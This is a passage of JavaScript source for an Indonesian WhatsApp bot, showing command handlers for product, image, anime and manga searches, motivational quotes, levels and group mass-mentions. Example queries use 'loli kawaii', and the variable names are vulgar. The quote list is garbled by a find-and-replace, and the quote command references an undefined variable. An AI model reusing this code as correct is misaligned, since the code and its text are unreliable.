                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    break
		   case 'shopee':
		            if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} tas gendong`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/shopee?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `Terjual : ${x.sold}\n`
                        ini_txt += `Stock : ${x.stock}\n`
                        ini_txt += `Lokasi : ${x.shop_loc}\n`
                        ini_txt += `Link : ${x.link_produk}\n\n`
                    }
                    reply(ini_txt)
                    break
                  case 'gimage':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join('  ')
                    ini_kontol = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=${query}`)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak })
                    break
                case 'gimage2':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gimage2?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_kontol = await getBuffer(get_result[x])
                        aldi.sendMessage(from, ini_kontol, image)
                    }
                    break
                case 'konachan':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} azur_lane`)
                    query = args.join('  ')
                    ini_kontol = await getBuffer(`http://api.lolhuman.xyz/api/konachan?apikey=${lolhuman}&query=${query}`)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak })
                    break
                case 'wallpapersearch':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join('  ')
                    ini_kontol = await getBuffer(`http://api.lolhuman.xyz/api/wallpaper?apikey=${lolhuman}&query=${query}`)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak })
                    break
                case 'wallpapersearch2':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper2?apikey=${lolhuman}&query=${query}`)
                    ini_kontol = await getBuffer(get_result.result)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak })
                    break  
                 case 'character':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Miku Nakano`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/character?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
                    thumbnail = await getBuffer(get_result.image.large)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    break
                case 'manga':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/manga?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Chapters : ${get_result.chapters}\n`
                    ini_txt += `Volume : ${get_result.volumes}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    break
                case 'anime':
                           
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/anime?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    break
                case 'stickerwa':
                    if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Koceng Imot`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_kontol = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${lolhuman}&img=${x}`)
                        aldi.sendMessage(from, ini_kontol, sticker)
                    }
                    break
		case 'quotesmotivasi':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
					const motiv =['Nilai sebuah tindakan terletak dalam usaha menyelesaikan sampai tuntas','Kebaikan adalah seorang yang matanya penuh perhatian, serta tangannya yang penuh manfaat','Hiduplah seperti kamu akan mati besok, dan berbahagialah seperti kamu akan hidup selamanya','Kita tidak usah saling menyalahkan, agar dimasa depan tak ada yang menuntut akan kesalahan','Ketika semua hal tidak sejalan dengan anda, ingatlah bahwa sebuah pesawat terbang mekawan angin, bukan dengan mengikuti angin','Belajarlah menikmati apa yang kamu miliki, itu akan membuat hidupmu lebih bernilai','Selalu ada kegelapan yang tergelap sebelum terbitnya fajar','Sahabat itu seperti bintang, tak selalu Nampak tetapi selalu ada dihati','Sibuk bukanlah jaminan karir karena hasil jauh lebih didengar orang','semua kemajuan tidak akan ada tanpa kesalahan, kesalahan adalah bagian dari kemajuan selama diakui dan diperbaiki','Sukses meninggalkan jejak, gagal meninggalkan pelajaran, diam meninggalkan penyesalan','Keraguan bersahabat dekat dengan kegagalan','uang tidak merusak seseorang, keserakahan lah yang merusak manusia','Kepercayaan tidak bisa dibeli, tapi kepercayaan bisa dipelihara','Impian, target, kemauan dan tujuan semuanya sia-sia tanpa tindakan','usia bisa berbohong tapi kedewasaan tidak','Ada yang lebih berharga dari uang dan emas yaitu waktu','Tidak ada yang gagal mereka hanya berhenti terlalu cepat','Terasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Seseorang tidak bisa sukses seringkali karena kurangnya keberanian untuk menkontolterasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Bicaralah secukupnya, lakukanlah semampunya. Jangan mekakukan sebaliknya','Ada saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','jangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','Kadang cara terbaik untuk Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','atasan hanya memberikan tugas berat pada karyawan terbaik, Allah hanya memberikan ujian pada pada manusia terbaikKadang cara terbaik untuk Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','berusaha dan gagal Ternyata jauh lebih mekegakan daripada pasrah mekihat ke kanan dengan tangan terlipat','lewat kesulitan lah manusia belajar, lewatnya kenyamanan lah manusia Terlena','Saat kita merasa hebat kita baru saja kehilangan separuh pangkat kita karena lengah untuk terus belajar','hidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang hebat membicarakan ide, orang menengah membicarakan pengalaman, orang lemah membicarakan orang lainOrang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Anda tidak akan mengubah kehidupan sampai anda mengubah Apa yang anda lakukan setiap hari','bertahan saja tidak cukup anda perlu bereaksi terhadap tekanan dan merubah keadaan','masa depan kita tergantung pada apa yang kita lakukan pada saat ini. Maka jangan sia-siakan waktumu sekarang','Nilai manusia ditentukan bukan dari apa yang diperoleh mekainkan apa yang telah diberikan','Malas adalah kemenangan saat ini dan kekalahan di masa nanti','sebuah masalah merupakan kesempatan bagi anda untuk mengeluarkan kemampuan terbaik anda','Kematian tidak dapat mengubur perbuatan baik seseorang','Asal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Jika ada hari buruk maka pasti akan hari ada hari baik tugas kita adalah terus bergerak majuAsal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Mengeluh adalah cara paling buruk dalam menyelesaikan masalah','Tetap Bertahan dan setia pada tujuan saat menghadapi Hambatan adalah kunci kesuksesan','Tidak perlu keahlian khusus untuk mencari musuh, tapi perlu kesetiaan untuk mempertahankan teman','Orang tua bukan hanya punya kekuatan untuk menatap juga untuk mengalah','Keuletan adalah tanda jadi kesuksesan','cepat atau lambat mereka yang menang adalah mereka yang berfikir dan yakin bahwa mereka bisa','Jaga terus Api Harapan Anda seperti menjaga hidup anda sendiri','Saat semua jalan tertutup. Buatlah jalan dan berserahlah kepada Allah','lari dari masalah bukanlah penyelesaian masalah, hadapi dan Belajarlah dari masalah itu','Rezeki itu ditangan Allah yang kita lakukan hanya berusaha semaksimal mungkin dan menyerahkan hasilnya kepada yang kuasa','Sukses dimulai dengan mekakukan apa yang harus aldiakukan','rasa syukur membuat kita tidak pernah merasa kekurangan','goal hanya sekedar goal kalau kita tidak mempunyai alasan yang kuat Mengapa kita harus mencapainya','Apapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','orang yang paling Bahagia bukanlah orang yang punya hal-hal terbaik tapi orang yang bisa menjadikan hal-hal yang ia punya menjadi yang terbaikApapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','Respon kita terhadap masalah menentukan kualitas berita fokus pada solusi','Semua yang terlalu sedikit dan terlalu banyak tidak akan membawa kebaikan','Tidak semua usaha kita dibayar oleh manusia, tapi Allah akan membayarnya kelak','Tidak ada harga untuk waktu, tetapi waktu sangat berharga','Sukses seringkali datang pada mereka yang berani bertindak dan jarang menghampiri pada mereka yang dikalahkan ketakutan','Katakan bisa pasti bisa dengan penuh keyakinan otak kita akan segera mencari solusi','Orang yang tidak belajar dari kegagalan adalah orang yang gagal sesungguhnya','Segala sesuatu masalah yang menimpa Anda tidak akan pernah mekatih kekuatan anda untuk menyelesaikannya','Saat orang lain mekakukan impianmu itu berarti mereka belum mampu mekihat sejauh anda mekihat','Allah tidak pernah terlambat ia akan menunjukkan kuasanya, pada detik terakhir sekalipun','Bukan banyaknya panah yang menentukan kemenangan tapi tajam panah dan tujuannya yang menentukan','Mengeluh itu sisi lain dari pemborosan, pemborosan waktu dan energy','Pikiran negatif sangat berkuasa bila diberi kesempatan, jadi jangan memberinya kesempatan','Cinta akan membuat kita menjadi orang terkaya di dunia, oleh karena itu mulailah mencintai','Cemas yang berlebihan tidak akan mengubah apapun kecuali merusak diri sendiri','Hidup ini sederhana terkadang pikiran manusia yang membuatnya rumit','Siapa yang bisa menerima kelemahannya sesungguhnya baru saja menambah satu kelebihan pada dirinya','Ada saatnya dimana kekalahan rasa manis yaitu Saat anda sudah mekakukan yang terbaik','Menabung itu hanya untuk mempertahankan kekayaan, untuk meningkatkannya berinvestasilah','Jika selamanya anda bermain aman, selamanya juga Anda di tempat yang sama','Lari dari masalah akan membuat masalah menjadi lebih besar, menghadapinya akan membuat anda menjadi lebih besar','Yang menyedihkan bukanlah bidikan yang mekeset tapi bidikan tanpa target','Hati yang sedang panas menumpulkan logika dinginkan terlebih dahulu sebelum mengambil keputusan','bila ingin hasil yang besar jangan kerjakan hal yang mudah saja','Jangan biarkan impianmu dijajah oleh pendapat orang lain','Mulailah dengan yang kecil, Kerjakanlah dengan cara yang besar adalah dengan cara yang benar','Pengaruh perkataan orang kepada anda 100% adalah atas izin anda sendiri','Bekerjalah dengan ikhlas karena bekerja tanpa paksaan akan memberi hasil maksimal','Suka belajar, suka jualan, hidup hemat, beli aset suka, sedekah adalah 5 resep Makmur','Lebih baik menjadi raja tikus daripada ekor naga','Kerja keras dan kerja cerdas dapat memastikan keberhasilan dan sedekah dapat memudahkannya','Sakit dalam perjuangan itu hanya berlangsung sementara, namun jika anda menyerah rasa sakit itu akan terasa selamanya','Kegagalan terbesar adalah ketika tidak berani menkontol','Langkah pertama yang diperlukan untuk mendapatkan hal yang anda inginkan adalah memutuskan apa yang anda inginkan','Jangan takut menghadapi masa depan, hadapi dan perjuangkanlah','Dahulukan Allah dalam setiap langkah hidupmu maka semuanya akan ditambahkan kepadamu','Kesulitan adalah hujan terbaik untuk menunjukkan kualitas diri yang sebenarnya','Kesalahan dan kegagalan adalah guru terbaik jika kita mau jujur mengakui dan belajar darinya','Diam belum tentu menyelesaikan masalah tapi setidaknya tidak membesarkan masalah','Pemenang sejati selalu memberikan 100% upayanya, bahkan ketika tidak seorang pun mekihatnya','Memaafkan orang lain bagai Menyiram air Bara dendam di hati baik untuk kesehatan kita','Jenius adalah 1 inspirasi dan 99 keringat tidak ada yang dapat menggantikan kerja keras','Disiplin memang tidak mudah tapi tanpa kedisiplinan hidup anda akan jauh lebih sulit','Orang yang berhenti belajar akan menjadi pemilik masa lalu, orang yang terus belajar akan menjadi pemilik masa depan','Hujan tidak hanya datang sendirian Ia datang bersama kesejukan, hal buruk tidak datang sendirian ia datang bersama pembelajaran','Menang atau kalah lakukanlah dengan jujur','Lihatlah tantangan sebagai ujian dan lihatlah masalah Sebagai teguran','Lihat ke atas agar terinspirasi lihat ke bawah agar bersyukur','Untuk meraih apa yang benar-benar anda inginkan fokus saja tidak cukup. Anda harus memiliki rasa lapar untuk meraihnya','90% dari kegagalan berasal dari orang-orang yang memiliki kebiasaan membuat alasan-alasan','Allah tidak membenci orang malas, tapi Allah mengizinkan orang rajin mengambil rezeki orang malas','Keajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Orang optimis dapat mekihat peluang dalam masalah, orang pesimis akan mekihat masalah dalam peluangKeajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Kualitas pikiran anda menentukan kualitas kehidupan anda','Bersyukur adalah cara ampuh untuk meraih energi yang dahsyat, Sudahkah anda bersyukur hari ini','Jangan mengharapkan sesuatu yang luar biasa jika anda hanya mau mekakukan hal yang biasa saja','Kebahagiaan dimulai dengan ketulusan','1000 perkataan dan pengetahuan tidak berarti tanpa adanya satu tindakan yang nyata','Tangkap peluang, kerjakan, selesaikan','Ketika situasi di sekolah Anda tidak menyenangkan. Di saat itulah sebenarnya karakter anda sedang dibentuk','Seorang pemberani bukan orang yang tidak mempunyai rasa takut. Tapi orang yang mampu berjalan diatas rasa takutnya','dalam takut yang tampak adalah hambatan, dalam yakin yang tampak adalah kesempatan','Tidak ada kata gagal yang ada hanya sukses atau perlu belajar lagi sampai berhasil','Menjadi tua itu pasti menjadi dewasa itu pilihan','Kehidupan yang besar dimulai dari mimpi yang besar','Tragedi dalam kehidupan ini bukanlah yang berakhir terlalu cepat, tetapi kita menunggu terlalu lama untuk memulainya','Takut akan kegagalan seharusnya tidak menjadi alasan untuk tidak menkontol sesuatu','Hari ini adalah hari pertama dalam hidup anda. Buatlah hari ini menjadi hari yang terbaik sepanjang hidup anda dan semoga hari esok matahari bersinar dengan terang','Saya berpikir bahwa ada suatu hal yang lebih penting daripada sekedar percaya, tindakan Dunia ini penuh dengan pemimpi ,tidaklah banyak orang yang berani maju ke depan dan Mulai mengambil langkah pasti untuk mewujudkan visi mereka','Anda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Allah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Pergilah sejauh mungkin dan ketika anda tiba di sana anda akan mekihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Menangis dapat mekepaskan tambahan hormon stress, itulah mengapa kita sehabis menangis merasa lebih baikPergilah sejauh mungkin dan ketika anda tiba di sana anda akan mekihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Ketika cinta itu dipertahankan kamu akan tau siapa yang lebih menghargai tentang sebuah hubungan','Dalam hidup ini banyak orang tahu apa yang harus aldiakukan, tetapi hanya sedikit yang mekakukan apa yang ia ketahui. Mengetahui tidaklah cukup, Anda harus mengambil tindakan','Berilah perhatian lebih ke orang yang kamu sayangi, itu yang mereka butuhkan','Satu ons tindakan sama berharganya dengan satu ton teori','Kita mungkin terpisah sejak lama ketika tak mampu belajar untuk lebih dewasa','Sayangilah dia walau tidak sesempurna seperti yang kau inginkan','Kecantikan akan mengundang perhatian sikap santun memikat Kalbu','Mengetahui tidaklah cukup kita harus mekakukannya, keinginan tak cukup hanya dengan berangan kita harus mekakukannya','Kesalahan adalah bukti bahwa kamu sedang menkontol','Betapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lebih baik sendiri daripada bersama dengan orang yang salahBetapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lakukan sesuatu hari ini yang akan membuat dirimu berterima kasih di hari-hari mendatang','Waktu yang memutuskan Dengan siapa kamu akan berjumpa','Hati yang memutuskan siapa yang kamu inginkan dalam hidup ini','Dengan sikap yang akan menentukan siapa yang akan bertahan dalam hidupmu','Menjadi dewasa dan bijak diawali dengan menjadi muda dan bodoh','Lakukanlah apa yang paling kamu takutkan dalam hidupmu','Bekerjalah seolah kamu tak butuh uang, Cintailah seolah Kamu takkan Tersakiti dan menarilah seakan tak ada yang mekihatmu','Jika hari ini sudah sempurna maka Apalah arti hari esok','Bintang pun tak kan bersinar tanpa kegelapan','Suatu saat aku akan menjadi tempat yang akan selalu kau rindu','Guru terbaik kamu adalah kesalahan terakhir yang kamu lakukan','Diam adalah respon terbaik untuk orang bodoh','Jangan pernah membuat keputusan yang permanen untuk perasaan yang sementara','Jika Allah yang menjadi alasan anda untuk hidup maka takkan pernah ada alasan untuk menyerah','Kegagalan ada bukan untuk ditakuti tetapi untuk dipelajari','Anda saat ini adalah hasil dari pengalaman anda','Keberuntungan adalah saat kesempatan datang, anda telah matang dengan segala persiapan','Jangan Menunggu hari yang terbaik untuk mekangkah karena setiap hari sangatlah berharga','Keputusan yang baik diperoleh dari pengalaman, dan pengalaman didapat dari keputusan yang buruk','Setiap waktu yang anda lewati dengan sia-sia hanya menjauhkan anda dan semakin jauh dari kata sukses','Realitas kehidupan Anda adalah deskripsi dari jiwa dan pikiran anda','Berani mengambil keputusan maka anda telah mekangkah 10 kali lebih cepat untuk sukses','Allah masih mencintai anda jika masih banyak kontolan dan tantangan hidup yang datang menghampiri anda. Allah percaya bahwa anda mampu mekaluinya, maka jagalah kepercayaan itu','Ketika orang mengatakan anda sudah berubah sebenarnya itu hanya karena anda berhenti mekakukan apa yang mereka ingin anda lakukan','Jangan menukar apa yang sangat anda inginkan untuk apa yang Anda ingin untuk saat ini','Orang-orang yang mengikuti keramaian biasanya tersesat di dalamnya','Orang tua saya bekerja terlalu keras untuk saya bukan supaya saya tidak hanya menjadi orang biasa tetapi menjadi orang luar biasa','Anda menghalangi impian anda ketika anda mengizinkan ketakutan Anda tumbuh lebih besar dari keyakinan anda','Sang juara percaya kepada dirinya sendiri bahkan ketika orang lain tidak percaya','Hanya mereka yang berani mengambil resiko yang jauh pasti dapat menemukan Seberapa jauh seseorang dapat pergi','Tunjukkan teman Anda, saya akan menunjukkan masa depan Anda','Beberapa orang ingin sesuatu terjadi, beberapa orang berharap itu akan terjadi, yang lain mewujudkannya jadi kenyataan','Jika anda menghabiskan waktu untuk menkontol menjadi baik dalam segala hal, Anda tidak akan pernah menjadi hebat dalam apapun','Sebuah perjalanan ribuan mil dimulai dari langkah kecil','Apa yang akan Anda kerjakan, Ketika anda tahu anda tidak mungkin gagal','Ketika kita memiliki satu sama lain, kita Memiliki segalanya','Kebesaran sebenarnya dapat ditemukan dalam hal hal kecil yang terkadang kita lewatkan','Bekerja keraslah, Bermimpilah lebih besar dan jaaldiah yang terbaik','Apa yang kita pikirkan menentukan apa yang akan terjadi pada kita. Jadi jika kita ingin mengubah hidup kita, kita perlu sedikit mengubah pikiran kita.','Seseorang yang berani membuang satu jam waktunya tidak mengetahui nilai dari kehidupan.','Saya memiliki filosofi yang sederhana: isi apa yang kosong, kosongkan apa yang terlalu penuh.','Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Anda di sini hanya untuk persinggahan yang singkat. Jangan terburu, jangan khawatir. Yakinlah bahwa Anda menghirup wangi bunga sepanjang perjalanan.Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Hidup adalah serangkaian perubahan yang alami dan spontan. Jangan tolak mereka karena itu hanya membuat penyesalan dan duka. Biarkan realita menjadi realita. Biarkan sesuatu mengalir dengan alami ke manapun mereka suka.','Hidup yang baik adalah hidup yang diinspirasi oleh cinta dan dipandu oleh ilmu pengetahuan.','Kenyataannya, Anda tidak tahu apa yang akan terjadi besok. Hidup adalah pengendaraan yang gila dan tidak ada yang menjaminnya.','Hidup adalah mimpi bagi mereka yang bijaksana, permainan bagi mereka yang bodoh, komedi bagi mereka yang kaya, dan tragedi bagi mereka yang miskin','Hidup itu bukan soal menemukan diri Anda sendiri, hidup itu membuat diri Anda sendiri.','Hal yang paling penting adalah menikmati hidupmu, menjadi bahagia, apapun yang terjadi.','Hidup itu sederhana, kita yang membuatnya sulit.']
					const vasi = motiv[Math.floor(Math.random() *   motiv.length)]
					vass = await getBuffer(`https://i.ibb.co/346nsHC/56806462-399407660892553-4745814299438481408-o.jpg`)
					aldi.sendMessage(from, vass, image, { quoted: fkontak, caption: 'Motivasi\n\n'+ cin })
					await limitAdd(sender)
					break
                case 'level':
		case 'lvl':
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (!isLevelingOn) return reply(ind.lvlnoon())
                if (!isGroup) return reply(aml.groupo)
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
                const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
                resul = `┏━━❉ LEVEL ❉━━\n┣⊱ Nama : ${pushname}\n┣⊱ Nomor : wa.me/${sender.split('@')[0]}\n┣⊱ User XP :  ${userXp}/${requiredXp}\n┣⊱ User Level : ${userLevel}\n┗━━━━━━━━━━━━`
               aldi.sendMessage(from, resul, text, { quoted: fkontak})
                .catch(async (err) => {
                        console.error(err)
                        await reply(`Error!\n${err}`)
                    })
					break
				case 'leaderboard':
				case 'lb':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (!isGroup) return reply(aml.groupo)
				_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
				uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
                let leaderboardlvl = '-----[ LEADERBOARD LEVEL ]----\n\n'
                let leaderboarduang = '-----[ LEADERBOARD UANG ]----\n\n'
                let nom = 0
                try {
                    for (let i = 0; i < 10; i++) {
                        nom++
                        leaderboardlvl += `[${nom}] wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n┗⊱ XP: ${_level[i].xp} Level: ${_level[i].level}\n`
                        leaderboarduang += `[${nom}] wa.me/${uang[i].id.replace('@s.whatsapp.net', '')}\n┣⊱ Uang: _Rp${uang[i].uang}_\n┗⊱ Limit: ${limitawal - _limit[i].limit}\n`
                    }
                    await reply(leaderboardlvl)
                    await reply(leaderboarduang)
                } catch (err) {
                    console.error(err)
                    await reply(`minimal 10 user untuk bisa mengakses database`)
                }
					break
					case 'info':
					case 'ingfo':
					case 'ingfokan':
					me = aldi.user
					uptime = process.uptime()
					teks = `Nama bot : ${me.name}\nOWNER : Farhan   Gans\nAUTHOR : Xone CHI  \nNomor Bot : @${me.jid.split('@')[0]}\nPrefix : ${prefix}\nTotal Block : ${blocked.length}\nBot aktif selama : ${kyun(uptime)}`
					lol = await getBuffer(me.imgUrl)
					aldi.sendMessage(from, lol, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
				case 'blocklist': 
					teks = '𝗕𝗟𝗢𝗖?? 𝗟𝗜𝗦𝗧 :\n'
					for (let block of blocked) {
						teks += `┣➢ @${block.split('@')[0]}\n`
					}
					teks += `𝗧𝗼𝘁𝗮𝗹 : ${blocked.length}`
					aldi.sendMessage(from, teks.trim(), extendedText, {quoted: ftoko, contextInfo: {"mentionedJid": blocked}})
					break
                 case 'hidetag':
                   if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					var value = body.slice(9)
					var group = await aldi.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: fkontak
					}
					aldi.sendMessage(from, options, text)
					await limitAdd(sender)
					break
					case 'setmemberlimit':
					if (args.length < 1) return
					if (!isOwner) return reply(aml.ownerb)
					if (isNaN(args[0])) return reply('limit harus angka')
